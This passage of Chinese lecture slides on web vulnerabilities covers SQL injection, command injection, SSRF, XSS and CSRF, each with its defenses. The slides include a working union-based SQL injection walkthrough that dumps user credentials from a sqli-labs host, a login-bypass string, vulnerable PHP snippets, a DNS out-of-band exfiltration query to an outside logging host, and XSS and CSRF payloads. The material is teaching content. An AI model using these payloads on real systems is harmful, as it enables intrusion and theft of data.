+-- 用户名字段输入 admin&#39; --  （注意 -- 左右两边各有一个空格）密码字段输入随意
+SELECT username, password FROM users WHERE username=&#39;admin&#39; -- &#39; and password=&#39;1&#39; LIMIT 0,1</code></pre>
+</section>
+<section id="sqli-procedure" class="slide level2">
+<h2>SQL 注入漏洞发现与利用的一般步骤</h2>
+<ul>
+<li>确认漏洞注入点存在
+<ul>
+<li>有报错回显
+<ul>
+<li>枚举/猜解：列数 –&gt; 数据库版本 –&gt; 表名 –&gt; 列名 –&gt; 具体值</li>
+</ul></li>
+<li>无报错回显 –&gt; SQL 盲注
+<ul>
+<li>利用 SQL 代码延迟执行时间差</li>
+<li>利用 SQL 代码执行返回结果差异制造页面渲染结果差别</li>
+</ul></li>
+</ul></li>
+</ul>
+</section>
+<section id="sqli-inclass-exp" class="slide level2">
+<h2>课内动手实验</h2>
+<p>利用 <code>sqli-labs</code> 里的 <code>Lesson-2 GET - Error based - Intiger based</code> 学习 <code>有报错回显</code> 经典 SQL 注入方法。</p>
+<pre class="bash"><code># 1. 判断注入点是否存在
+
+http://192.168.56.144:7080/Less-2/?id=2&#39;
+
+# 2. 枚举字段数
+
+http://192.168.56.144:7080/Less-2/?id=2 order by 1
+http://192.168.56.144:7080/Less-2/?id=2 order by 2
+http://192.168.56.144:7080/Less-2/?id=2 order by 3
+# 4 时报错，说明当前查询对应的结果集数量（如果是单表查询则说明当前表的列数）为 3
+http://192.168.56.144:7080/Less-2/?id=2 order by 4
+
+# 3. 检查是否支持 union 查询
+# 第一次页面返回结果无变化
+http://192.168.56.144:7080/Less-2/?id=2 union all select 1,2,3 -- 
+# 第二次页面返回结果原先 name 字段显示 2 password 字段显示 3
+# 说明返回结果集合的第2和第3个字段值分别对应在这 2 个位置上回显输出
+http://192.168.56.144:7080/Less-2/?id=2 union all select 1,2,3 limit 1,1 -- 
+
+# 4. 获取数据库版本信息、数据库连接权限和当前数据库实例名
+http://192.168.56.144:7080/Less-2/?id=2 union all select 1,concat(version(),0x3a,user(),0x3a,database()),3 limit 1,1 -- 
+
+# 5. 获取表名
+# mysql &lt; 5 只能靠字典爆破方式获取表名和列名
+# mysql &gt;= 5 可以通过查询系统库 information_schema 获取
+# 以下逐一枚举系统中所有表名
+http://192.168.56.144:7080/Less-2/?id=2 union all select 1,table_name,3 from information_schema.tables where table_schema=&#39;security&#39; limit 1,1 -- 
+...
+http://192.168.56.144:7080/Less-2/?id=2 union all select 1,table_name,3 from information_schema.tables where table_schema=&#39;security&#39; limit 4,1 -- 
+
+# 6. 查询列名
+http://192.168.56.144:7080/Less-2/?id=2 union all select 1,column_name,3 from information_schema.columns where table_name=&#39;users&#39;  limit 1,1 -- 
+http://192.168.56.144:7080/Less-2/?id=2 union all select 1,column_name,3 from information_schema.columns where table_name=&#39;users&#39; limit 2,1 -- 
+http://192.168.56.144:7080/Less-2/?id=2 union all select 1,column_name,3 from information_schema.columns where table_name=&#39;users&#39; limit 3,1 -- 
+
+# 7. 获取表内数据
+http://192.168.56.144:7080/Less-2/?id=2 union all select 1,concat(id,0x3a,username,0x3a,password),3 from users limit 1,1 -- 
+http://192.168.56.144:7080/Less-2/?id=2 union all select 1,concat(id,0x3a,username,0x3a,password),3 from users limit 2,1 -- 
+...
+
+# TODO 总结以上手工测试过程，编写自动化脚本</code></pre>
+</section>
+<section id="sqli-tools" class="slide level2">
+<h2>SQL 注入攻击的自动化工具</h2>
+<p><a href="http://sqlmap.org/">sqlmap</a></p>
+</section>
+<section id="sqli-tutorials" class="slide level2">
+<h2>SQL 手工注入方法与技巧学习</h2>
+<ul>
+<li><a href="https://www.exploit-db.com/papers/13045">Full SQL Injection Tutorial (MySQL)</a></li>
+<li>分析 <a href="http://sqlmap.org/">sqlmap</a> 的流量</li>
+</ul>
+</section>
+<section id="sqli-impacts" class="slide level2">
+<h2>SQL 注入攻击的典型危害</h2>
+<ul>
+<li>越权读取数据</li>
+<li>绕过访问控制</li>
+<li>篡改数据</li>
+<li>写文件</li>
+<li>读文件</li>
+<li>代码执行</li>
+</ul>
+</section>
+<section id="prevention-to-sqli" class="slide level2">
+<h2>SQL 注入攻击的防御</h2>
+<ul>
+<li>代码级别 <strong>一劳永逸</strong> 修复
+<ul>
+<li>使用 <a href="https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html#:~:text=This%20coding%20style%20allows%20the,are%20inserted%20by%20an%20attacker.">预编译 SQL 语句</a></li>
+</ul></li>
+<li>纵深防御措施
+<ul>
+<li>最小化数据库连接权限</li>
+<li>输入数据白名单</li>
+</ul></li>
+<li>缓解措施
+<ul>
+<li>使用 <code>Web 应用防火墙</code> （WAF）</li>
+</ul></li>
+</ul>
+</section>
+</section>
+<section>
+<section id="command-injection" class="title-slide slide level1">
+<h1>11. 命令注入</h1>
+
+</section>
+<section class="slide level2">
+
+<ul>
+<li>命令注入有时也称为代码注入，两者在大部分场景下具有相同的含义</li>
+<li><code>SQL 注入</code> 本身就是一种特殊的 <code>命令注入</code> ：针对 <code>SQL 服务器</code> 的 <code>命令注入</code></li>
+</ul>
+</section>
+<section id="shell-cmdi" class="slide level2">
+<h2>shell 命令注入</h2>
+<p><a href="https://asciinema.org/a/tKaq8ngneFOr6O96q8ZsBC4L8"><img data-src="https://asciinema.org/a/tKaq8ngneFOr6O96q8ZsBC4L8.svg" alt="shell 命令注入漏洞演示" /></a></p>
+</section>
+<section id="prevention-to-cmdi" class="slide level2">
+<h2>shell 命令注入漏洞的代码级别防御</h2>
+<p>以 <code>PHP</code> 为例（其他语言类似）</p>
+<ul>
+<li>输入数据过滤
+<ul>
+<li><code>shell</code> 命令过滤: <a href="https://www.php.net/manual/zh/function.escapeshellcmd.php">escapeshellcmd</a></li>
+<li><code>shell</code> 命令 <strong>参数</strong> 过滤：<a href="https://www.php.net/manual/zh/function.escapeshellarg.php">escapeshellarg</a></li>
+</ul></li>
+</ul>
+</section>
+<section class="slide level2">
+
+<h3 id="filter-is-a-double-sword-1">过滤是把“双刃剑”</h3>
+<blockquote>
+<p>同时使用以上这 2 个过滤函数是否防御效果加倍呢？</p>
+</blockquote>
+</section>
+<section class="slide level2">
+
+<h3 id="filter-is-a-double-sword-2">过滤是把“双刃剑”</h3>
+<p><a href="https://paper.seebug.org/164/">PHPMailer 小于 5.2.18 版本的 RCE 漏洞，官方在补丁中使用了 escapeshellarg() 来修复漏洞</a>。但在 PHPMailer 的 <code>mail.c</code> 的函数内部又使用了一遍 <code>escapeshellcmd()</code> ，导致输入数据中经过 <code>escapeshellarg()</code> 处理后单引号先被 <strong>\</strong> 转义一次，再用单引号对输入参数的左右两部分进行了包围处理。后来遇到 <code>escapeshellcmd()</code> 处理时，先前被添加的 <strong>\</strong> 又被转义了一次，变成了 <strong>\</strong>，并且命令中所有的单引号又被转义了一次，最终导致输入参数又变回了一个可以被执行的操作系统命令。</p>
+</section>
+<section id="表达式注入漏洞" class="slide level2">
+<h2>表达式注入漏洞</h2>
+<ul>
+<li><a href="https://www.mindedsecurity.com/fileshare/ExpressionLanguageInjection.pdf">公开资料可以找到的最早讨论表达式注入漏洞的文章是 2011 年 Stefano 和 Arshan 联合发表的Expression Language Injection</a>
+<ul>
+<li>Spring MVC 框架中 Spring MVC JSP 标签可以执行 Java 代码</li>
+<li>涉及到的表达式语言引擎包括：Struts 2 的 OGNL，Spring 的 SPEL 等</li>
+</ul></li>
+<li>Apache Struts 2 的 <a href="https://cwiki.apache.org/confluence/display/WW/S2-014">S2-014</a> 就是一个典型的表达式注入漏洞，官方漏洞危害评级为：高危</li>
+<li>另一个知名的 Java 企业级 Web 开发流行框架 Spring 在历史上同样爆出过表达式注入漏洞
+<ul>
+<li>例如 <a href="https://nvd.nist.gov/vuln/detail/CVE-2016-4977">CVE-2016-4977</a>、<a href="https://nvd.nist.gov/vuln/detail/CVE-2017-4971">CVE-2017-4971</a>、<a href="https://nvd.nist.gov/vuln/detail/CVE-2018-1270">CVE-2018-1270</a>和<a href="https://nvd.nist.gov/vuln/detail/CVE-2018-1273">CVE-2018-1273</a></li>
+</ul></li>
+</ul>
+</section>
+<section class="slide level2">
+
+<blockquote>
+<p>截止目前，表达式注入漏洞均发生在 Java 程序之中，未来其他的 Web 开发技术也有可能出现这种类似的表达式存在，有鉴于已有的这些表达式漏洞的危害巨大。届时，表达式注入漏洞可能将成为 Web 应用程序漏洞挖掘的一个重要方向。</p>
+</blockquote>
+</section>
+<section id="summary-of-cmdi" class="slide level2">
+<h2>小结</h2>
+<ul>
+<li>和前述输入相关的通用漏洞一样， <strong>数据输入过滤</strong> 是防御命令注入漏洞的基本方法</li>
+<li>「插件」和「安全」需要兼顾
+<ul>
+<li>纵深防御机制，而不仅仅是在代码级别的安全加固保障
+<ul>
+<li>沙盒环境运行代码</li>
+<li>最小化权限运行代码</li>
+<li>网络隔离与最小化子网划分</li>
+</ul></li>
+</ul></li>
+</ul>
+</section>
+</section>
+<section>
+<section id="ssrf" class="title-slide slide level1">
+<h1>12. 服务端请求伪造</h1>
+
+</section>
+<section class="slide level2">
+
+<p><strong>Server</strong> Side Request Foregery, SSRF</p>
+</section>
+<section class="slide level2">
+
+<ul>
+<li><code>文件包含</code>、<code>XXE 注入</code>、<code>反序列化漏洞</code> 都可以被用来构造和触发 <code>SSRF</code>
+<ul>
+<li>这就是典型的「组合漏洞」和「链式漏洞利用」</li>
+</ul></li>
+<li>严格来说，<code>SSRF</code> 不是一种独立 <strong>漏洞类型</strong> ，而是一种 <strong>漏洞利用类型</strong></li>
+</ul>
+</section>
+<section id="ssrf-code-snippet" class="slide level2">
+<h2>一段 SSRF 风险代码</h2>
+<pre class="php"><code>&lt;?php
+function curl($url){
+    $ch = curl_init();
+    curl_setopt($ch, CURLOPT_URL, $url);
+    curl_setopt($ch, CURLOPT_HEADER, 0);
+    curl_exec($ch);
+    curl_close($ch);
+}
+$url = $_GET[&#39;url&#39;];
+curl($url);</code></pre>
+</section>
+<section class="slide level2">
+
+<p>由于 curl 支持的协议类型非常广泛（根据官网描述可知有不下 20 种网络协议均可以通过 curl 访问读取），因此上述漏洞代码可以访问诸如：服务器上本地文件（利用 <code>file://</code>）和远程 Web 服务器上的文件（利用 <code>http://</code> 和 <code>https://</code>）等等。</p>
+</section>
+<section id="ssrf-misc" class="slide level2">
+<h2>另类 SSRF</h2>
+<ul>
+<li>除了文件读取时容易造成 SSRF 漏洞（例如文档、图片、音视频处理等在接受文件路径输入参数时很可能同时支持本地和网络协议 URL）</li>
+<li>数据库的一些内置功能（加载网络地址时会自动对其中包含的域名字段进行 DNS 查询）也会被利用在 SQL 注入的过程中获取数据</li>
+</ul>
+</section>
+<section class="slide level2">
+
+<h3 id="ssrf-in-sqli">SQL 注入过程中的 SSRF</h3>
+<p>以 <a href="http://sqlmap.org/">sqlmap</a> 为例，在其众多数据获取技巧中提供了一个命令行参数 <code>--dns-domain</code> 就是实现了利用 SQL 数据库在执行一些特定函数时会对其中传入的参数当作域名进行查询这个特性的 <code>基于 DNS 的带外数据回传</code></p>
+</section>
+<section class="slide level2">
+
+<pre class="sql"><code>select load_file(concat(&#39;\\\\&#39;, version(), &#39;.6a7087aa4e3b2c743ed1.d.zhack.ca\\1.txt&#39;));</code></pre>
+<p>成功执行上述 SQL 代码将会在 <a href="http://dnsbin.zhack.ca/">dnsbin.zhack.ca</a> 的 DNS 解析服务器上留下一条 DNS 查询记录，如下图所示：</p>
+<p><img data-src="images/chap0x07/dnsbin-1.png" /></p>
+</section>
+<section class="slide level2">
+
+<ul>
+<li>需要注意的是，MySQL 的全局配置参数 <a href="https://dev.mysql.com/doc/refman/5.7/en/server-system-variables.html#sysvar_secure_file_priv">secure_file_priv</a> 的设定会影响到 <code>load_file()</code> 是否解析参数中包含的域名
+<ul>
+<li>在从 MySQL 官网下载的 5.7.16 之前独立安装包版本或 5.7.5 之前所有版本的 <code>secure_file_priv</code> 缺省设置均为空，则上述攻击代码能得手</li>
+<li>但如果设置为 NULL 则会禁用文件读取操作，如果设置为指定目录，则只能从指定目录读取文件</li>
+</ul></li>
+</ul>
+</section>
+<section id="小结" class="slide level2">
+<h2>小结</h2>
+<ul>
+<li>SSRF 漏洞既可以发生在服务器端脚本所在的主机，也可能发生在后台服务（如上文中举例的数据库）主机</li>
+<li>SSRF 漏洞一旦被利用可以被用来进行内网服务发现和扫描、作为跳板攻击内网或本地应用程序和 Web 应用等，甚至是任意读取 SSRF 漏洞触发所在主机上的本地文件</li>
+<li>防御 SSRF 漏洞的基本方法除了输入相关的通用漏洞防御方法之外，对于重要的后台服务启用 <code>身份认证</code> 和 <code>二次鉴权</code> 可以有效的缓解 SSRF 的漏洞利用效果</li>
+</ul>
+</section>
+</section>
+<section>
+<section id="输出相关漏洞" class="title-slide slide level1">
+<h1>输出相关漏洞</h1>
+
+</section>
+<section class="slide level2">
+
+<ul>
+<li>跨站点脚本</li>
+<li>信息泄露</li>
+</ul>
+</section>
+</section>
+<section>
+<section id="xss" class="title-slide slide level1">
+<h1>13. 跨站点脚本</h1>
+
+</section>
+<section id="xss-history" class="slide level2">
+<h2>XSS 考古</h2>
+<ul>
+<li>跨站点脚本（Cross-Site Scripting，XSS）的简写没有采用 <code>CSS</code> 是为了避免和另一个术语 <code>层叠样式表（Cascading Style Sheet）</code> 产生歧义</li>
+<li>公开资料最早提及 XSS 威胁的来自于 1996 年 6 月 30 日 <code>comp.sys.acorn.misc</code> 新闻组的一条消息，如下页图所示。</li>
+</ul>
+</section>
+<section class="slide level2">
+
+<p><img data-src="images/chap0x07/xss-history-1.png" /></p>
+</section>
+<section id="xss-impacts-in-the-old-days" class="slide level2">
+<h2>“古代” XSS 的漏洞利用效果</h2>
+<ul>
+<li>盗取用户浏览历史记录</li>
+<li>盗取用户邮箱地址</li>
+<li>下载恶意文件并诱骗用户打开运行</li>
+<li>遍历磁盘上的文件</li>
+</ul>
+</section>
+<section id="evil-livescript" class="slide level2">
+<h2>XSS 的前身：恶意浏览器脚本</h2>
+<ul>
+<li>1995 年 9 月 18 日，Netscape Navigator 2.0 发布。一个月后 Netscape 为其下一个公开测试版浏览器上线了“漏洞悬赏（Bugs Bounty）”计划并在一周后收到了第一个漏洞报告
+<ul>
+<li><code>恶意 LiveScript（JavaScript 语言的前身） 可以用于盗取用户在访问指定恶意网页之前的所有的浏览历史记录</code></li>
+</ul></li>
+<li>相比二进制漏挖和利用的难度和时间成本，脚本漏洞挖掘和利用更容易、效果也有特别惊人的时候
+<ul>
+<li>客户端脚本漏洞攻防研究开始成为安全行业关注热点</li>
+</ul></li>
+</ul>
+</section>
+<section id="modern-xss-1" class="slide level2">
+<h2>现代 XSS 相比 <code>“古代” XSS</code></h2>
+<ul>
+<li>漏洞利用目标没变：跨域访问（读取和篡改）数据</li>
+<li>漏洞基本原理没变：恶意代码运行在浏览器上
+<ul>
+<li>混合式应用的流行使得原生应用和 Web 应用的边界变得模糊：『无头浏览器』和『嵌入式 JS 引擎』流行起来</li>
+</ul></li>
+</ul>
+</section>
+<section id="modern-xss-2" class="slide level2">
+<h2>现代 XSS 相比 <code>“古代” XSS</code> 漏洞挖掘难度“没变”</h2>
+<p><a href="https://www.cvedetails.com/vulnerabilities-by-types.php"><img data-src="images/chap0x07/xss-cve-history-1.png" /></a></p>
+</section>
+<section class="slide level2">
+
+<blockquote>
+<p>相比于年度漏洞总数的变化趋势，XSS 的漏洞总数变化非常稳定</p>
+</blockquote>
+</section>
+<section id="modern-xss-3" class="slide level2">
+<h2>现代 XSS 相比 <code>“古代” XSS</code> 漏洞挖掘难度“没变”</h2>
+<p><a href="https://www.cvedetails.com/vulnerabilities-by-types.php"><img data-src="images/chap0x07/xss-cve-history-2.png" /></a></p>
+</section>
+<section class="slide level2">
+
+<blockquote>
+<p>众所周知「预编译 SQL 语句」的普及使得 SQL 注入漏洞挖掘难度越来越高，所以 SQL 注入漏洞的年度统计趋势是呈明显下降趋势的</p>
+</blockquote>
+</section>
+<section id="modern-xss-4" class="slide level2">
+<h2>现代 XSS 相比 <code>“古代” XSS</code> 利用价值“稳中有升”</h2>
+<p><a href="https://www.cvedetails.com/vulnerabilities-by-types.php"><img data-src="images/chap0x07/xss-cve-history-3.png" /></a></p>
+</section>
+<section class="slide level2">
+
+<blockquote>
+<p>只看 XSS 漏洞数量的年度统计，“稳中有升”的曝光数量间接证明了其利用价值是“稳中有升”的：从投入产出比的经济学角度思考</p>
+</blockquote>
+</section>
+<section id="modern-xss-features" class="slide level2">
+<h2>现代 XSS 相比 <code>“古代” XSS</code> 的主要变化</h2>
+<ul>
+<li>客户端碎片化趋势加剧
+<ul>
+<li>万物互联的物联网终端设备</li>
+</ul></li>
+<li>客户端可编程能力加强
+<ul>
+<li>现代计算力的跨时代提升</li>
+</ul></li>
+<li>客户端安全防御水平参差不齐
+<ul>
+<li>原因复杂，但现状和趋势未见有明确改变的路径</li>
+</ul></li>
+<li>客户端代码复杂度提升
+<ul>
+<li>前端框架的繁荣和前端工程化水平的发展轨迹</li>
+</ul></li>
+</ul>
+</section>
+<section id="why-xss-is-output-based" class="slide level2">
+<h2>为什么 XSS 被归类到「输出相关漏洞」</h2>
+<pre class="php"><code>&lt;?php
+$msg = $_GET[&#39;msg&#39;];
+// 用户提交的消息被作为关键字提交到后台进行信息检索
+// 页面同时把用户输入的搜索关键词展示出来
+echo &quot;&lt;div&gt;$msg&lt;/div&gt;&quot;;</code></pre>
+</section>
+<section id="the-simplest-exp-code" class="slide level2">
+<h2>可能是最简单的一种「漏洞攻击」<code>代码</code></h2>
+<pre class="html"><code>&lt;img src=1 onerror=alert(1)&gt;</code></pre>
+<p>“攻击者”在访问包含上述 PHP 代码的网页时，在浏览器地址栏里输入查询参数 <code>msg=</code> 上述 <code>XSS 攻击代码</code> 后回车，将会看到当前浏览的页面出现一个「警告对话框」，显示内容为 <code>1</code> 。</p>
+<p><img data-src="images/chap0x07/xss-firefox.png" /></p>
+</section>
+<section id="is-xss-really-easy" class="slide level2">
+<h2>XSS 也太好学了吧？</h2>
+<blockquote>
+<p>Too young, too simple!</p>
+</blockquote>
+</section>
+<section class="slide level2">
+
+<p><img data-src="images/chap0x07/xss-firefox-blame.png" /></p>
+<blockquote>
+<p>为什么 2018 年 8 月写作本节内容时是在 Firefox 浏览器上实验并截图的呢？因为彼时的 Google Chrome 有专门 XSS 的内置启用防御组件 <code>xss-auditor</code> ，这段代码在彼时的 Google Chrome 上是无法运行成功的！</p>
+</blockquote>
+</section>
+<section class="slide level2">
+
+<p><img data-src="images/chap0x07/xss-chrome.png" /></p>
+</section>
+<section class="slide level2">
+
+<blockquote>
+<p>前方「倒车」请注意，请猜猜哪个浏览器是 Google Chrome ？</p>
+</blockquote>
+<p><img data-src="images/chap0x07/xss-hello-world-in-2020.08.27.png" /></p>
+</section>
+<section id="why-xss-auditor-is-discontinued" class="slide level2">
+<h2>Google Chrome 主动放弃 XSS-Auditor</h2>
+<p><a href="https://www.chromium.org/developers/design-documents/xss-auditor"><img data-src="images/chap0x07/xss-auditor-removed.png" /></a></p>
+</section>
+<section class="slide level2">
+
+<h3 id="positive-to-abandon">正方（支持放弃 XSS-Auditor）观点</h3>
+<ul>
+<li>Web 脚本代码自身的漏洞就应该依赖于提高代码质量来解决，而不是依赖于「通用」缓解措施
+<ul>
+<li>是不是在学习 <code>SQL 注入的安全解决方案</code> 时听过类似的观点？</li>
+</ul></li>
+<li>浏览器开发者不能总惯着前端工程师，是时候 “放手” 让他们成长了
+<ul>
+<li>新一批工程师们多学点「安全开发知识」，从代码层面杜绝掉 XSS 漏洞
+<ul>
+<li>学会用浏览器的 <code>CSP 安全策略</code> 、<code>Cookie 安全机制里的 HttpOnly 属性</code></li>
+</ul></li>
+</ul></li>
+<li>误报太多，影响复杂前端渲染和交互逻辑的实现</li>
+</ul>
+</section>
+<section class="slide level2">
+
+<h3 id="negative-to-abandon">反方（反对放弃 XSS-Auditor）观点</h3>
+<ul>
+<li>在浏览器底层多做一层「安全缓解」措施，这是符合「纵深防御」黄金策略原则的</li>
+<li>指望“这一届”程序员们学会安全开发？呵呵。再等等“下一届”吧。</li>
+</ul>
+</section>
+<section class="slide level2">
+
+<blockquote>
+<p>八卦结束，回到正题。</p>
+</blockquote>
+</section>
+<section class="slide level2">
+
+<ul>
+<li>前一个演示的这个 XSS 效果对应的 XSS 类型被称为 <code>“反射型” XSS</code>
+<ul>
+<li><code>反射型 XSS</code> 只是简单地把用户输入的数据“反射”给浏览器</li>
+<li>攻击者往往需要诱骗用户“点击”一个恶意链接，链接中包含 XSS 代码，才能攻击成功</li>
+<li>反射型 XSS 也被称为 <code>“非持久型 XSS”</code></li>
+</ul></li>
+</ul>
+</section>
+<section id="xss-types" class="slide level2">
+<h2>XSS 漏洞类型分类</h2>
+<ul>
+<li><code>“反射型” XSS</code> （ Reflective XSS，也被称为 <code>“非持久型 XSS”</code>）</li>
+<li>存储型 XSS （Stored XSS）
+<ul>
+<li>利用浏览器的 <code>客户端存储机制</code> 存储 XSS 攻击代码</li>
+<li>利用服务器端的数据库等持久化存储机制存储 XSS 攻击代码</li>
+</ul></li>
+<li>基于文档对象模型的 XSS（DOM Based XSS）
+<ul>
+<li>早期也被视为 <code>“反射型” XSS</code></li>
+<li><a href="http://www.webappsec.org/projects/articles/071105.shtml">Amit Klein 在 2005 年的一篇技术报告</a> 首先提出 <code>DOM Based XSS</code> 这个概念，业界自此逐渐接受这个更精细化的分类</li>
+<li>演变发展过程中结合了 <code>客户端存储机制</code> 实现了持久化的 <code>DOM Based XSS</code></li>
+</ul></li>
+</ul>
+</section>
+<section id="xss-exploit-obstacles" class="slide level2">
+<h2>XSS 漏洞利用很难通杀所有浏览器</h2>
+<p><img data-src="images/chap0x07/xss-hello-world-in-2020.08.27-with-notes.png" /></p>
+</section>
+<section id="xss-without-js" class="slide level2">
+<h2>离开 JavaScript 也能来一次 XSS 攻击</h2>
+<figure>
+<img data-src="images/chap0x07/noscript-xss.png" alt="" /><figcaption>页面篡改钓鱼</figcaption>
+</figure>
+</section>
+<section id="xss-in-real" class="slide level2">
+<h2>XSS 实战技巧</h2>
+<ul>
+<li>在绝大多数情况下，XSS 中都会包含 JavaScript 代码，以完成更高级的漏洞利用效果</li>
+<li>从攻击者角度看 XSS
+<ul>
+<li>发现和验证 XSS 的存在性虽然容易，但只是第一步</li>
+<li>和谐完美利用达到最大化漏洞利用效果非常不容易</li>
+<li>工具党的福音 <a href="https://beefproject.com/">BeEF, The Browser Exploitation Framework</a></li>
+</ul></li>
+</ul>
+</section>
+<section id="prevention-to-xss-1" class="slide level2">
+<h2>防御 XSS</h2>
+<ul>
+<li>服务端脚本在「输出」数据时，要进行「转义」操作</li>
+<li>「输出」数据的「转义」要按内容是 HTML 还是 JavaScript 进行区别操作，以下以 PHP 代码为例说明具体操作注意事项：
+<ul>
+<li>对于 HTML 的输出转义应使用 <a href="http://php.net/manual/zh/function.htmlspecialchars.php"><code>htmlspecialchar()</code></a> 函数（且大多数情况下应在第二个参数设置 <code>ENT_QUOTES</code> 来转义单引号）</li>
+<li>对于 JavaScript 的输出转义，特别是涉及到 JavaScript 变量的过滤仅仅使用 <code>htmlspecialchars()</code> 是不够的，很多 RESTful 接口应用还会使用 <code>json_encode()</code> 去处理服务端脚本输出给客户端的 JavaScript 变量值</li>
+</ul></li>
+</ul>
+</section>
+<section id="prevention-to-xss-2" class="slide level2">
+<h2>防御 XSS</h2>
+<ul>
+<li>在客户端脚本中尽可能使用 <code>innerText()</code> 之类的函数来过滤服务端脚本对客户端变量的赋值</li>
+<li>联合现代浏览器的客户端安全机制，共同对抗 XSS
+<ul>
+<li>在服务端输出 HTML 时，加上 <a href="https://w3c.github.io/webappsec-csp/"><code>Content Security Policy</code></a> 的 HTTP 响应头</li>
+<li>低版本浏览器可能不支持，但某些低版本浏览器支持一些自定义 HTTP 响应头 <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-XSS-Protection">X-XSS-Protection</a> 来限制加载执行不可信脚本</li>
+<li>在设置 Cookie 时，加上 HttpOnly 参数避免关键 Cookie 字段被脚本访问</li>
+</ul></li>
+</ul>
+</section>
+<section id="prevention-to-xss-3" class="slide level2">
+<h2>防御 XSS</h2>
+<ul>
+<li>由于 XSS 漏洞的实际触发位置是在浏览器，因此即使按照上述服务端脚本的代码安全最佳实践去实现「净化」输出，但如果 XSS 漏洞再利用一些浏览器漏洞（特别是一些字符集编码漏洞）进行配合，那么依然难免 XSS 漏洞</li>
+<li>不过好在这种情况发生的概率要远远低于由于服务端脚本没有「净化」输出导致的 XSS</li>
+<li>使用正确的「净化」输出方案是在代码级别防御 XSS 的最重要手段</li>
+</ul>
+</section>
+</section>
+<section>
+<section id="info-leakage" class="title-slide slide level1">
+<h1>14. 信息泄露</h1>
+
+</section>
+<section class="slide level2">
+
+<ul>
+<li>代码运行时调试信息泄露
+<ul>
+<li>例如前述 <code>SQL 注入漏洞</code> 在有错误信息回显时的漏洞利用难度会大大降低</li>
+</ul></li>
+<li>隐私数据未做脱敏操作就输出给客户端
+<ul>
+<li>如信用卡号、手机号、身份证号等，在发送给前端之前用星号代替</li>
+<li>中国的 18 位公民身份证号码从最早的全部明文显示在软件界面上，发展经历了遮蔽4位数字、8位数字，直到只显示首末 2 位数字（如支付宝）</li>
+<li>非必需展示和发送给客户端的数据，应避免在服务端脚本直接输出</li>
+</ul></li>
+</ul>
+</section>
+</section>
+<section>
+<section id="再看一个输入相关的有趣漏洞" class="title-slide slide level1">
+<h1>再看一个输入相关的有趣漏洞</h1>
+
+</section>
+<section class="slide level2">
+
+<p>CSRF 漏洞</p>
+</section>
+</section>
+<section>
+<section id="csrf" class="title-slide slide level1">
+<h1>15. CSRF 漏洞</h1>
+
+</section>
+<section class="slide level2">
+
+<ol type="1">
+<li>利用站点已验证通过的用户会话（无需获取用户的登录凭证）</li>
+</ol>
+<p>http://victim.org/addFriend.do?friend=attacker@gmail.com</p>
+<ol start="2" type="1">
+<li><p>当一个已经登录 <code>victim.org</code> 的用户打开一个包含有 <code>XSS</code> 攻击代码的页面（或者通过一个隐藏的iframe），并且该 <code>XSS</code> 代码执行上述的 <code>URL</code> 请求，则该用户就会执行 <code>addFriend</code> 这个操作</p></li>
+<li><p>结果：用户在不知情的情况下添加了攻击者作为自己的好友</p></li>
+</ol>
+</section>
+<section class="slide level2">
+
+<figure>
+<video data-src="images/chap0x07/csrf-facebook-add-backdoor-account.mp4" controls=""><a href="images/chap0x07/csrf-facebook-add-backdoor-account.mp4"></a></video><figcaption>添加后门账号</figcaption>
+</figure>
+</section>
+<section id="csrf-notorious-event" class="slide level2">
+<h2>CSRF 知名安全事件</h2>
+<ul>
+<li>新浪微博 <code>2011 年 6 月 28 日</code> 晚间的大规模 <code>XSS+CSRF</code> 蠕虫事件
+<ul>
+<li>事件时间线：16分钟
+<ul>
+<li>20:14，开始有大量带V的认证用户中招转发蠕虫</li>
+<li>20:30，2kt.cn中的病毒页面无法访问</li>
+<li>20:32，新浪微博中hellosamy用户无法访问</li>
+<li>21:02，新浪漏洞修补完毕</li>
+</ul></li>
+<li>感染人数：32961人！</li>
+</ul></li>
+<li>病毒作者使用的用户名 <code>hello-samy</code> 是为了向世界上第一个 <code>XSS+CSRF</code> 蠕虫作者 <code>samy</code> 致敬</li>
+</ul>
+</section>
+<section id="csrf-description" class="slide level2">
+<h2>CSRF 描述</h2>
+<ul>
+<li>从名称上来看类似跨站点攻击，但实质上完全不同：
+<ul>
+<li>XSS 是滥用用户对 Web 站点的信任</li>
+<li>CSRF 是滥用 Web 站点对其授权用户的信任</li>
+</ul></li>
+<li>伪装成来自受信任站点的合法用户
+<ul>
+<li>有时也被称为会话劫持攻击</li>
+</ul></li>
+<li>典型案例
+<ul>
+<li>诱骗用户访问一个图片源标记为恶意请求链接的页面，从而触发一个异步的恶意远程调用</li>
+<li>接受受信任并且通过验证的用户的输入但并不检查数据的来源地址</li>
+</ul></li>
+</ul>
+</section>
+<section id="csrf-vs-xss" class="slide level2">
+<h2>与 XSS 的联系</h2>
+<ul>
+<li>跨站点请求伪造通常伴随 XSS 漏洞利用过程</li>
+<li>先有 XSS，再有 CSRF
+<ul>
+<li>借助 XSS 漏洞获得在用户浏览器执行脚本的机会</li>
+</ul></li>
+<li>没有 XSS，一样可以有 CSRF
+<ul>
+<li>借助已通过网站认证和获得授权的用户浏览器会话
+<ul>
+<li>假借用户的合法cookie</li>
+</ul></li>
+</ul></li>
+<li>一个URL即可触发一次CSRF
+<ul>
+<li>http://victim.org/deluser.php?id=admin</li>
+</ul></li>
+</ul>
+</section>
+<section id="prevention-to-csrf-1" class="slide level2">
+<h2>防御 CSRF</h2>
+<ol type="1">
+<li>对 <code>HTTP Header</code> 中的 <code>Referer</code> 字段进行验证</li>
+</ol>
+<ul>
+<li><code>HTTP Referer</code> 字段记录了该 HTTP 请求的来源地址。在通常情况下，访问一个安全受限页面的请求必须来自于同一个网站
+<ul>
+<li>只需要对于每一个 POST 请求验证其 Referer 值，如果是来源于「受信任」域名的请求，则接受</li>
+<li>如果 Referer 是其他网站的话，就有可能是 CSRF 攻击，则拒绝该请求</li>
+</ul></li>
+</ul>
+</section>
+<section id="prevention-to-csrf-2" class="slide level2">
+<h2>防御 CSRF</h2>
+<ol start="2" type="1">
+<li>在 POST 请求中添加 token 作为参数并验证</li>
+</ol>
+<ul>
+<li>这种安全策略被各种 Web 框架广泛采用（包括 <code>Laravel</code> 等）</li>
+<li>CSRF 漏洞能够被利用的主要原因就是用户的全部验证信息均保存在 <code>Cookie</code> 中，攻击者可以在不接触到 <code>Cookie</code> 的前提下完成身份验证
+<ul>
